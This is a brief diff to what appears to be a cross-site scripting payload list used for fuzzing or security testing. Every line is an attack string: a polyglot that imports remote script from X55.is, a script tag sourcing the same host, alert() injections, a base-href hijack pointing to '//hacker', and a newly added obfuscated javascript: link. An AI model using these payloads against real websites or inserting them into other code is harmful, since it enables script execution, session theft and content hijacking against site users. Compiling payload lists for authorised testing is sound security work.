@@ -1,7 +1,8 @@
 JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(import(/https:\\http://X55.is/.source))}//\76-->
 'Src="//X55.is/>?<Script/K='
 <script>alert(0)</script>
-"><base href=//hacker>
+"><base href=//hacker>|
+<A %252F=""Href= JavaScript:k='a',top[k%2B'lert'](1)>
 ["');alert('XSS');//"]@xyz.xxx
 <script>a="import\x28"</script>
 <script>b="`//0-a\x2e"</script>
